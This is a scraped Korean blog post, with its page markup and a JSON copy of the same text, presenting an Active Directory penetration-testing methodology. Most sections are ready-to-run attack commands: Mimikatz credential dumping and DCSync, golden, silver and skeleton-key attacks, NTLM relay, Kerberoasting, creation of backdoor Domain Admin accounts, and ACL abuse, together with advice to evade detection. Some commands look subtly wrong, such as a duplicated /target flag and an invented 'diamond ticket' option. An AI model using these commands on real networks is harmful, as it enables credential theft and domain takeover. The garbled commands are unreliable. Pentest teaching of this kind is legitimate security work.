<li>마스터 암호를 사용하여 모든 계정을 인증하세요.</li>
</ol>
<h1>사용자 정의 SSP</h1>
<ul>
<li>사용자 정의 보안 지원 공급자를 설치하세요.</li>
<li>SSP를 사용하여 인증 프로세스를 캡처하거나 조작하세요.</li>
</ul>
<h1>DCShadow</h1>
<ul>
<li>DCShadow를 사용하여 로그인 DC를 등록하세요.</li>
</ul>
<pre><code class="hljs language-js">mimikatz.<span class="hljs-property">exe</span> <span class="hljs-string">"privilege::debug"</span> <span class="hljs-string">"lsadump::dcshadow /push"</span> <span class="hljs-string">"exit"</span>
</code></pre>
<ol start="2">
<li>수정된 객체 및 권한을 조작하기 위해 AD 데이터베이스에 변경 사항을 푸시하세요.</li>
</ol>
<pre><code class="hljs language-js">mimikatz.<span class="hljs-property">exe</span> <span class="hljs-string">"privilege::debug"</span> <span class="hljs-string">"lsadump::dcshadow /update"</span> <span class="hljs-string">"exit"</span>
</code></pre>
<h1>LAPS 지속성</h1>
<ul>
<li>액세스를 유지하는 데 LAPS 설정을 활용하세요.</li>
</ul>
<pre><code class="hljs language-js"><span class="hljs-title class_">Get</span>-<span class="hljs-title class_">ADComputer</span> -<span class="hljs-title class_">Filter</span> * -<span class="hljs-title class_">Property</span> <span class="hljs-string">"ms-MCS-AdmPwd"</span> | <span class="hljs-title class_">Select</span>-<span class="hljs-title class_">Object</span> <span class="hljs-title class_">Name</span>, <span class="hljs-string">"ms-MCS-AdmPwd"</span>
</code></pre>
<ol start="2">
<li>주기적으로 암호를 업데이트하고 검색하여 지속성을 보장하세요.</li>
</ol>
<h1>Forest Privilege Escalation — Domain Trusts</h1>
<ul>
<li>상호도메인 신뢰를 식별합니다.</li>
</ul>
<pre><code class="hljs language-js"><span class="hljs-title class_">Get</span>-<span class="hljs-title class_">ADTrust</span> -<span class="hljs-title class_">Filter</span> *
</code></pre>
<p>숲 전체에서 권한을 상승시키기 위해 신뢰 관계를 악용하세요.</p>
<h1>초보자를 위한 팁</h1>
<h1>피해야 할 흔한 실수</h1>
<ul>
<li><strong>정찰 건너뛰기:</strong> 환경을 이해하기 위해 철저한 정찰이 중요합니다.</li>
<li><strong>패치 관리 무시하기:</strong> 환경이 패치로 최신 상태인지 확인하세요.</li>
<li><strong>권한 상승 경로 간과하기:</strong> BloodHound와 같은 도구를 사용하여 모든 가능한 경로를 식별하고 악용하세요.</li>
</ul>
<h1>도전과 해결책</h1>
<ul>
<li>AD 환경의 복잡성: 환경을 더 작은 세그먼트로 나누어 각각을 철저히 분석하십시오.</li>
<li>보안 시스템에 의한 탐지: 탐지를 최소화하는 은밀한 기술과 도구를 사용하십시오.</li>
<li>문서화 부족: 과정과 결과를 이해하기 위해 각 단계를 신중하게 문서화하십시오.</li>
</ul>
<p>Active Directory 펜테스팅은 AD 구조 및 서비스에 대한 심층적인 이해와 취약점을 식별하고 악용하는 방법론적인 접근이 필요한 복합적인 작업입니다. 이 문서에서 소개된 포괄적인 방법론을 따르면 시스템적으로 취약점을 발견하고 권한을 상승시키며 AD 환경의 보안을 극대화할 수 있습니다. 경험을 쌓으면서 기술을 더욱 정교하게 개선하고 새로운 취약성과 악용 방법을 파악하는 것이 중요합니다. AD 펜테스팅은 결함을 찾는 데 그치는 것이 아니라 IT 인프라의 보안과 유연성에 기여하는 것입니다.</p>
<p>Active Directory의 보안을 확보하는 것은 조직의 IT 환경 전반의 안전에 중요합니다. 철저한 펜테스트를 수행하고 식별된 취약점에 대처함으로써 조직은 가치 있는 자산을 보호하고 강력한 보안 자세를 유지할 수 있습니다.</p>
<p>📎 커피 한 잔 사주세요</p>
</body>
</html>
</div></article></div></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"title":"펜테스팅에서의 Active Directory 방법론 포괄적인 가이드","description":"","date":"2024-06-19 21:17","slug":"2024-06-19-ActiveDirectoryMethodologyinPentestingAComprehensiveGuide","content":"\n\n요즘의 디지털 환경에서 Active Directory (AD)는 대부분의 기업 환경에서 네트워크 자원을 관리하는 중추 역할을 합니다. AD는 사용자, 컴퓨터 및 기타 자원을 관리하기 위한 중앙 집중화 및 구조화된 구조를 제공함으로써 복잡한 IT 시스템의 관리를 간편화합니다. 그 중요성을 고려할 때 Active Directory의 보안을 보장하는 것이 매우 중요합니다. 이 문서는 Active Directory의 세부 사항을 들여다보고 AD 환경을 펜테스팅하기 위한 포괄적인 방법론을 개요하고 있습니다. 초보자든 중급 보안 전문가든, 이 안내서는 Active Directory를 효과적으로 펜테스팅하고 취약성을 식별하며 조직의 전체적인 보안 체계를 강화하기 위한 지식과 도구를 제공합니다.\n\n![Active Directory Methodology in Pentesting - A Comprehensive Guide](/assets/img/2024-06-19-ActiveDirectoryMethodologyinPentestingAComprehensiveGuide_0.png)\n\n## Active Directory 이해하기\n\n## 주요 개념\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- 디렉터리: 디렉터리는 네트워크 내 객체에 대한 정보를 저장하는 계층적 구조입니다. AD에서 이 디렉터리는 사용자, 컴퓨터 및 기타 리소스에 대한 데이터를 저장하는 데 사용됩니다.\n- 객체: 객체는 AD 내의 다양한 엔티티를 나타냅니다. 일반적인 객체에는 사용자, 그룹, 컴퓨터 및 프린터가 포함됩니다. 각 객체에는 사용자의 이름, 이메일, 비밀번호와 같은 속성이 있습니다.\n- 도메인: 도메인은 동일한 AD 데이터베이스를 공유하는 객체들의 논리적 그룹입니다. 이는 보안 경계 역할을 하며 이러한 객체들의 중앙화된 관리를 제공합니다.\n- 트리: 트리는 계층적 구조로 연결된 하나 이상의 도메인 모음입니다. 트리 내의 도메인은 연속적인 네임스페이스를 공유합니다.\n- 포리스트: 포리스트는 AD에서 최상위 컨테이너이며 하나 이상의 트리로 구성됩니다. 포리스트 내의 트리는 공통 전역 카탈로그, 디렉터리 스키마 및 구성을 공유합니다.\n\n# Active Directory 도메인 서비스 (AD DS)\n\nAD DS는 Active Directory에서 제공하는 핵심 서비스로, 여러 중요 기능을 포함하고 있습니다:\n\n- 도메인 서비스: 인증, 권한 부여 및 디렉터리 서비스를 제공합니다.\n- 인증서 서비스: 안전한 통신을 위해 디지털 인증서를 발급하고 관리합니다.\n- 경량 디렉터리 서비스: 전체 기능이 필요 없는 애플리케이션을 위한 AD DS의 간소화된 버전을 제공합니다.\n- 디렉터리 페더레이션 서비스: 조직 경계를 넘어 단일 로그인(SSO) 기능을 제공합니다.\n- 권리 관리: 암호화 및 정책 시행을 통해 민감한 데이터를 보호합니다.\n- DNS 서비스: AD와 통합하여 이름 해결 서비스를 제공합니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# Active Directory 펜테스팅: 방법론과 기술\n\n# 자격 증명 또는 세션 없이 수행하는 정찰\n\n본격적인 펜테스팅 활동에 들어가기 전에 수동으로 환경을 이해하는 것이 중요합니다. Nmap과 같은 도구를 사용하여 열린 포트와 서비스를 스캔할 수 있습니다. 또한 NetBIOS 및 DNS 열거를 통해 AD 구조 및 사용 가능한 호스트에 대한 유용한 통찰을 얻을 수 있습니다.\n\n## 명령어:\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```bash\nnmap -sP \u003c대상_네트워크_범위\u003e\nnmap -p 88,135,139,389,445,636,3268,3269,3389 -sV -O \u003c대상_IP\u003e\nnbtscan \u003c대상_네트워크_범위\u003e\nnslookup -type=SRV _ldap._tcp.dc._msdcs.\u003c도메인\u003e\n```\n\n- Nmap\n- nbtscan\n\n# 사용자 열거\n\nldapsearch 또는 enum4linux와 같은 도구를 사용하여 사용자 열거를 할 수 있습니다. 이 도구들은 LDAP 및 SMB 프로토콜을 활용하여 사용자 및 그룹에 대한 정보를 수집합니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## 명령어:\n\n```js\nldapsearch -x -h \u003c도메인_컨트롤러_IP\u003e -b \"dc=예제,dc=com\" \"(objectclass=user)\"\nenum4linux -U \u003c대상_IP\u003e\n```\n\n- ldapsearch\n- enum4linux\n\n# LLMNR/NBT-NS 독점공격\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\nLLMNR 및 NBT-NS 독려는 인증 요청을 캡처하고 중계하는 기술로 사용됩니다. Responder와 같은 도구를 사용하여 이러한 요청을 수신하고 해시를 캡처할 수 있으며, 이는 후속 공격에 사용될 수 있습니다.\n\n## 명령어:\n\n```js\nsudo responder -I \u003c네트워크_인터페이스\u003e\n```\n\n- Responder\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# NTLM 릴레이\n\nNTLM 릴레이 공격은 NTLM 해시를 캡처하고 다른 서비스로 릴레이하여 무단 액세스를 얻는 것을 의미합니다. NTLMRelayX는 이러한 공격을 수행하는 데 강력한 도구입니다.\n\n## 명령어:\n\n```js\nsudo ntlmrelayx.py -tf targets.txt -smb2support\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- NTLMRelayX\n\n# 자격 증명 도용\n\nMimikatz와 같은 도구를 사용하여 메모리에서 평문 암호, 해시, PIN 코드 및 케르버로스 티켓을 추출하여 자격 증명 도용이 가능합니다.\n\n## 명령어:\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nmimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n```\n\n- Mimikatz\n\n# 자격 증명 또는 세션을 사용하여 Active Directory 나열하기\n\n한 번 자격 증명을 획득하면 BloodHound와 같은 도구를 사용하여 AD 환경을 매핑하고 관련성 및 잠재적인 공격 경로를 식별할 수 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## 명령어:\n\n```js\nSharpHound.exe -c All\n```\n\n- BloodHound\n\n# Kerberoasting\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n케로버로스팅은 SPN(서비스 주체 이름)에 대한 서비스 티켓을 요청하고 이를 오프라인으로 깨서 평문 암호를 얻는 방법입니다. 이 기술에는 Rubeus와 같은 도구가 일반적으로 사용됩니다.\n\n## 명령어:\n\n```js\nRubeus.exe kerberoast\n```\n\n- Rubeus\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 원격 연결 (RDP, SSH, FTP, Win-RM)\n\n원격 연결을 악용하려면 Metasploit이나 Cobalt Strike와 같은 도구를 사용하여 RDP, SSH, FTP 및 Win-RM과 같은 서비스를 통해 접근할 수 있습니다.\n\n## 명령어:\n\n```js\nmsfconsole\nuse exploit/windows/rdp/rdp_login\nset RHOSTS \u003c대상_ip\u003e\nset USERNAME \u003c사용자명\u003e\nset PASSWORD \u003c암호\u003e\nrun\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- Metasploit\n\n# 현재 세션 티켓\n\n현재 세션 티켓을 분석하면, 하이재킹이나 측면 이동에 악용될 수 있는 활성 세션을 식별하는 데 도움이 됩니다.\n\n## 명령어:\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nklist 세션\n```\n\n# 컴퓨터 공유에서 자격 증명 찾기\n\n공유 폴더를 스캔하여 저장된 자격 증명을 확인하면 일반 텍스트 암호나 민감한 정보가 포함된 스크립트를 발견할 수 있습니다. SharpHound와 같은 도구를 사용하면 이 프로세스를 자동화할 수 있습니다.\n\n## 명령어:\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nSharpHound.exe -c Shares\n```\n\n- SharpHound\n\n# 특정 Exploits\n\n## CVE-2021–1675 (PrintNightmare)\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n프린트 악몽(PrintNightmare)은 프린트 스풀러 서비스의 취약점을 악용하는 악용 프로그램입니다. PrintNightmare과 같은 도구는 이를 이용하여 권한 상승을 얻습니다.\n\n## 명령어:\n\n```js\nPrintNightmare.exe \u003c대상_ip\u003e\n```\n\n- PrintNightmare\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## CVE-2021–34527 (프린트 나이트메어)\n\n이것은 프린트 나이트메어 취약점의 다른 변형입니다. 적절한 패치 관리와 중요 서버에서 프린트 스풀러 서비스를 비활성화하면 이 위험을 완화할 수 있습니다.\n\n## 명령어:\n\n```js\nStop-Service -Name Spooler -Force\nSet-Service -Name Spooler -StartupType Disabled\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 핵심 펜테스팅 기법에 대한 단계별 안내서\n\n# 특권 자격 증명/세션을 이용한 Active Directory 권한 상승\n\n- BloodHound와 같은 도구를 사용하여 취약 경로를 식별합니다.\n\n```js\nSharpHound.exe -c All\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n2. 토큰 위조 또는 서비스 남용과 같은 기술을 사용하여 경로를 악용합니다.\n\n```js\nmimikatz.exe \"privilege::debug\" \"token::elevate\" \"exit\"\n```\n\n3. 제한된 리소스에 액세스하려고 시도하여 액세스를 확인합니다.\n\n```js\ndir \\\\\u003ctarget_ip\u003e\\c$\nmimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n3. 해시를 추출하려면 sekurlsa::logonpasswords 명령을 실행하세요.\n\n- 추출된 해시를 안전하게 저장하여 나중에 사용하세요.\n\n# 패스 더 해시\n\n- 대상 계정의 NTLM 해시를 획득하세요.\n- 해당 해시를 Mimikatz나 Pass-the-Hash Toolkit과 같은 도구와 함께 사용하여 평문 암호 없이 인증하세요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n\nmimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:\u003cusername\u003e /domain:\u003cdomain\u003e /ntlm:\u003chash\u003e /run:cmd.exe\" \"exit\"\n\n\n# 해시/키 전달하기\n\n- Mimikatz와 같은 도구를 사용하여 Kerberos 키를 추출합니다.\n\n\nmimikatz.exe \"privilege::debug\" \"sekurlsa::ekeys\" \"exit\"\n\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n2. 키를 사용하여 Kerberos 티켓을 요청하고 인증하세요.\n\n```js\nmimikatz.exe \"kerberos::ptt \u003cticket.kirbi\u003e\"\n```\n\n# 티켓 전달\n\n- Mimikatz를 사용하여 Kerberos 티켓을 추출하세요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nmimikatz.exe \"kerberos::list\" \"kerberos::ptt \u003cticket.kirbi\u003e\" \"exit\"\n```\n\n2. Mimikatz를 사용하여 현재 세션에 티켓을 삽입합니다.\n\n# 자격 증명 재사용\n\n- 다른 서비스 간에 재사용된 자격 증명 식별\n- 획득한 자격 증명을 사용하여 다른 서비스에서 인증합니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# MSSQL 남용 및 신뢰할 수 있는 링크\n\n- 네트워크 내 MSSQL 서버 식별\n\n```js\nsqlcmd -L\n```\n\n2. 명령 실행 또는 데이터 검색을 위해 신뢰할 수 있는 링크 악용.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nsqlcmd -S \u003c대상_서버\u003e -U \u003c사용자_이름\u003e -P \u003c암호\u003e\n```\n\n# 제약이 없는 위임\n\n- 제약이 없는 위임이 설정된 계정을 식별합니다.\n\n```js\nGet-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n2. 계정을 위장하여 위임을 남용하십시오.\n\n```js\nmimikatz.exe \"kerberos::golden /domain:\u003c도메인\u003e /sid:\u003c도메인SID\u003e /target:\u003c대상서비스\u003e /rc4:\u003c서비스계정해시\u003e /user:\u003c대상사용자\u003e /service:\u003c서비스명\u003e /target:\u003c대상FQDN\u003e\" \"exit\"\n```\n\n# 제한된 위임\n\n- 위임이 허용된 서비스 식별하기.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nGet-ADUser -Filter {msDS-AllowedToDelegateTo -ne $null} -Properties msDS-AllowedToDelegateTo\n```\n\n서비스 계정을 탈취하여 위임을 악용하십시오.\n\n# 리소스 기반 제한된 위임\n\n- 리소스 기반 위임 설정 식별하기.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nGet-ADComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -ne $null} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity\n```\n\n2. 권한 상승을 얻기 위해 설정을 악용하세요.\n\n# ACL 악용\n\n- BloodHound와 같은 도구를 사용하여 ACL 열거.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nSharpHound.exe -c All\n```\n\n2. 추가 권한을 부여하려면 ACL을 수정하세요.\n\n```js\nInvoke-ACLpwn -Domain \u003c도메인\u003e -Principal \u003c사용자\u003e -AddFullControl\n```\n\n# 프린터 스풀러 서비스 남용\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- 알려진 취약점을 이용하여 프린트 스풀러 서비스를 악용합니다.\n- 해당 서비스를 악용하여 권한을 상승시킵니다.\n\n```js\nPrintNightmare.exe \u003c대상_ip\u003e\n```\n\n# 타사 세션 남용\n\n- 활성 타사 세션을 식별합니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nklist 세션\n```\n\n2. 불허된 접근 권한을 얻기 위해 세션을 해킹하세요.\n\n# LAPS\n\n- AD에 저장된 LAPS 비밀번호를 검색하세요.\n\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```ps\nGet-ADComputer -Filter * -Property \"ms-MCS-AdmPwd\" | Select-Object Name, \"ms-MCS-AdmPwd\"\n```\n\n2. 지역 관리자 계정에 접근하기 위해 비밀번호를 사용하세요.\n\n# 인증서 도난\n\n- AD에 저장된 인증서를 식별하세요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\ncertutil -store -user My\n```\n\n2. Certify와 같은 도구를 사용하여 인증서를 추출하세요.\n\n```js\nCertify.exe find /type:domain\n```\n\n# 인증서 템플릿 남용\n\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- 자격증 템플릿 나열하기\n\n```js\ncertutil -TCAInfo\n```\n\n- 설정이 잘못된 템플릿을 남용하여 상위 권한 획득하기\n\n```js\nCertify.exe request /ca:\u003cCA Name\u003e /template:\u003cTemplate Name\u003e\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 고 권한 계정으로 Post-Exploitation\n\n- DCSync와 같은 도구를 사용하여 도메인 자격 증명 덤프하기.\n\n```js\nmimikatz.exe \"lsadump::dcsync /domain:\u003c도메인\u003e /user:\u003c사용자\u003e\" \"exit\"\n```\n\n2. 새 계정 생성 또는 그룹 멤버쉽 수정을 통해 권한 상승하기.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nnet user \u003cusername\u003e \u003cpassword\u003e /add\nnet group \"Domain Admins\" \u003cusername\u003e /add\n```\n\n# 도메인 자격 증명 덤프\n\n- Mimikatz를 사용하여 DCSync 실행.\n\n```js\nmimikatz.exe \"lsadump::dcsync /domain:\u003cdomain\u003e /user:\u003cuser\u003e\" \"exit\"\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n2. 덤프된 자격 증명은 안전하게 저장하세요.\n\n# 권한 상승 및 지속성\n\n- 백도어 계정 생성을 통해 액세스 유지\n\n```js\nnet user \u003cusername\u003e \u003cpassword\u003e /add\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n2. 보안 설명자를 수정하여 지속성을 확보합니다.\n\n```js\nSet-ACL -경로 \"AD:\u003c경로\u003e\" -ACLObject $acl\n```\n\n# 실버 티켓\n\n- 서비스 계정 해시를 사용하여 실버 티켓을 생성합니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nmimikatz.exe \"kerberos::golden /domain:\u003c도메인\u003e /sid:\u003c도메인_SID\u003e /target:\u003c대상_서비스\u003e /rc4:\u003c서비스_계정_해시\u003e /user:\u003c대상_사용자\u003e /service:\u003c서비스_이름\u003e /target:\u003c대상_FQDN\u003e\" \"exit\"\n```\n\n2. 도메인 컨트롤러와 통신하지 않고 서비스에 인증합니다.\n\n# 골든 티켓\n\n- KRBTGT 계정 해시를 추출합니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nmimikatz.exe \"lsadump::dcsync /domain:\u003c도메인\u003e /user:krbtgt\" \"exit\"\n```\n\n2. 도메인 관리자 권한을 얻기 위해 골든 티켓 생성.\n\n```js\nmimikatz.exe \"kerberos::golden /user:\u003c사용자이름\u003e /domain:\u003c도메인\u003e /sid:\u003c도메인SID\u003e /krbtgt:\u003ckrbtgt 해시\u003e /id:\u003c사용자ID\u003e /groups:\u003c그룹ID들\u003e\" \"exit\"\n```\n\n# 다이아몬드 티켓\n\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- 특별 권한이 있는 다이아몬드 티켓을 만들어보세요.\n\n```js\nmimikatz.exe \"kerberos::golden /user:\u003cusername\u003e /domain:\u003cdomain\u003e /sid:\u003cdomain_sid\u003e /krbtgt:\u003ckrbtgt_hash\u003e /id:\u003cuser_id\u003e /groups:\u003cgroup_ids\u003e /extra:\u003cextra_privileges\u003e\" \"exit\"\n```\n\n2. 네트워크 내에서 특정 작업에 해당 티켓을 사용하세요.\n\n# 인증서 계정 지속성\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- 지속성을 유지하기 위해 인증서 템플릿을 남용하지 않도록 주의하세요.\n\n```js\nCertify.exe request /ca:\u003cCA Name\u003e /template:\u003cTemplate Name\u003e\n```\n\n2. 인증서를 다시 발급하여 계속된 액세스를 보장하세요.\n\n```js\nCertify.exe renew /id:\u003ccert_id\u003e\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 인증서 도메인 지속성\n\n- 도메인 인증서를 수정하여 상위 액세스를 유지하세요.\n- 주기적으로 인증서를 갱신하여 지속적인 액세스를 보장하세요.\n\n```js\nCertify.exe renew /id:\u003ccert_id\u003e\n```\n\n# AdminSDHolder 그룹\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- AdminSDHolder 그룹 설정을 수정합니다.\n\n```js\nSet-ADObject -Identity \"CN=AdminSDHolder,CN=System,DC=\u003c도메인\u003e,DC=com\" -Replace @{adminCount=1}\n```\n\n2. 변경 사항이 전파되도록 상위 권한을 유지합니다.\n\n```js\nSet-ADUser -Identity \u003c사용자이름\u003e -Replace @{adminCount=1}\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# DSRM 자격 증명\n\n- 도메인 컨트롤러에서 DSRM 자격 증명을 검색합니다.\n\n```js\nntdsutil \"set dsrm password\" \"reset password on server \u003c서버명\u003e\" \"quit\"\n```\n\n2. 이 자격 증명을 사용하여 디렉터리 서비스 복원 모드(Directory Services Restore Mode)에서 DC에 액세스합니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# ACL 지속성\n\n- 접근을 유지하기 위해 ACL을 수정하세요.\n\n```js\nInvoke-ACLpwn -Domain \u003c도메인\u003e -Principal \u003c사용자\u003e -AddFullControl\n```\n\n2. 변경 내용이 삭제되지 않도록 보호하여 지속성을 보장하세요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 보안 기술자\n\n- 잘못된 설정을 위한 보안 기술자 분석\n\n```js\nGet-ACL -Path \"AD:\u003c경로\u003e\"\n```\n\n2. 특권 상승을 위해 잘못된 설정을 이용하세요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nSet-ACL -Path \"AD:\u003c경로\u003e\" -ACLObject $acl\n```\n\n# 스켈레톤 키\n\n- 도메인 컨트롤러에 스켈레톤 키를 배포합니다.\n\n```js\nmimikatz.exe \"privilege::debug\" \"misc::skeleton\" \"exit\"\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n2. 마스터 암호를 사용하여 모든 계정을 인증하세요.\n\n# 사용자 정의 SSP\n\n- 사용자 정의 보안 지원 공급자를 설치하세요.\n- SSP를 사용하여 인증 프로세스를 캡처하거나 조작하세요.\n\n# DCShadow\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- DCShadow를 사용하여 로그인 DC를 등록하세요.\n\n```js\nmimikatz.exe \"privilege::debug\" \"lsadump::dcshadow /push\" \"exit\"\n```\n\n2. 수정된 객체 및 권한을 조작하기 위해 AD 데이터베이스에 변경 사항을 푸시하세요.\n\n```js\nmimikatz.exe \"privilege::debug\" \"lsadump::dcshadow /update\" \"exit\"\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# LAPS 지속성\n\n- 액세스를 유지하는 데 LAPS 설정을 활용하세요.\n\n```js\nGet-ADComputer -Filter * -Property \"ms-MCS-AdmPwd\" | Select-Object Name, \"ms-MCS-AdmPwd\"\n```\n\n2. 주기적으로 암호를 업데이트하고 검색하여 지속성을 보장하세요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# Forest Privilege Escalation — Domain Trusts\n\n- 상호도메인 신뢰를 식별합니다.\n\n```js\nGet-ADTrust -Filter *\n```\n\n숲 전체에서 권한을 상승시키기 위해 신뢰 관계를 악용하세요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 초보자를 위한 팁\n\n# 피해야 할 흔한 실수\n\n- **정찰 건너뛰기:** 환경을 이해하기 위해 철저한 정찰이 중요합니다.\n- **패치 관리 무시하기:** 환경이 패치로 최신 상태인지 확인하세요.\n- **권한 상승 경로 간과하기:** BloodHound와 같은 도구를 사용하여 모든 가능한 경로를 식별하고 악용하세요.\n\n# 도전과 해결책\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- AD 환경의 복잡성: 환경을 더 작은 세그먼트로 나누어 각각을 철저히 분석하십시오.\n- 보안 시스템에 의한 탐지: 탐지를 최소화하는 은밀한 기술과 도구를 사용하십시오.\n- 문서화 부족: 과정과 결과를 이해하기 위해 각 단계를 신중하게 문서화하십시오.\n\nActive Directory 펜테스팅은 AD 구조 및 서비스에 대한 심층적인 이해와 취약점을 식별하고 악용하는 방법론적인 접근이 필요한 복합적인 작업입니다. 이 문서에서 소개된 포괄적인 방법론을 따르면 시스템적으로 취약점을 발견하고 권한을 상승시키며 AD 환경의 보안을 극대화할 수 있습니다. 경험을 쌓으면서 기술을 더욱 정교하게 개선하고 새로운 취약성과 악용 방법을 파악하는 것이 중요합니다. AD 펜테스팅은 결함을 찾는 데 그치는 것이 아니라 IT 인프라의 보안과 유연성에 기여하는 것입니다.\n\nActive Directory의 보안을 확보하는 것은 조직의 IT 환경 전반의 안전에 중요합니다. 철저한 펜테스트를 수행하고 식별된 취약점에 대처함으로써 조직은 가치 있는 자산을 보호하고 강력한 보안 자세를 유지할 수 있습니다.\n\n📎 커피 한 잔 사주세요","ogImage":{"url":"/assets/img/2024-06-19-ActiveDirectoryMethodologyinPentestingAComprehensiveGuide_0.png"},"coverImage":"/assets/img/2024-06-19-ActiveDirectoryMethodologyinPentestingAComprehensiveGuide_0.png","tag":["Tech"],"readingTime":13},"content":"\u003c!doctype html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\n\u003cmeta charset=\"utf-8\"\u003e\n\u003cmeta content=\"width=device-width, initial-scale=1\" name=\"viewport\"\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n\u003cp\u003e요즘의 디지털 환경에서 Active Directory (AD)는 대부분의 기업 환경에서 네트워크 자원을 관리하는 중추 역할을 합니다. AD는 사용자, 컴퓨터 및 기타 자원을 관리하기 위한 중앙 집중화 및 구조화된 구조를 제공함으로써 복잡한 IT 시스템의 관리를 간편화합니다. 그 중요성을 고려할 때 Active Directory의 보안을 보장하는 것이 매우 중요합니다. 이 문서는 Active Directory의 세부 사항을 들여다보고 AD 환경을 펜테스팅하기 위한 포괄적인 방법론을 개요하고 있습니다. 초보자든 중급 보안 전문가든, 이 안내서는 Active Directory를 효과적으로 펜테스팅하고 취약성을 식별하며 조직의 전체적인 보안 체계를 강화하기 위한 지식과 도구를 제공합니다.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/assets/img/2024-06-19-ActiveDirectoryMethodologyinPentestingAComprehensiveGuide_0.png\" alt=\"Active Directory Methodology in Pentesting - A Comprehensive Guide\"\u003e\u003c/p\u003e\n\u003ch2\u003eActive Directory 이해하기\u003c/h2\u003e\n\u003ch2\u003e주요 개념\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e디렉터리: 디렉터리는 네트워크 내 객체에 대한 정보를 저장하는 계층적 구조입니다. AD에서 이 디렉터리는 사용자, 컴퓨터 및 기타 리소스에 대한 데이터를 저장하는 데 사용됩니다.\u003c/li\u003e\n\u003cli\u003e객체: 객체는 AD 내의 다양한 엔티티를 나타냅니다. 일반적인 객체에는 사용자, 그룹, 컴퓨터 및 프린터가 포함됩니다. 각 객체에는 사용자의 이름, 이메일, 비밀번호와 같은 속성이 있습니다.\u003c/li\u003e\n\u003cli\u003e도메인: 도메인은 동일한 AD 데이터베이스를 공유하는 객체들의 논리적 그룹입니다. 이는 보안 경계 역할을 하며 이러한 객체들의 중앙화된 관리를 제공합니다.\u003c/li\u003e\n\u003cli\u003e트리: 트리는 계층적 구조로 연결된 하나 이상의 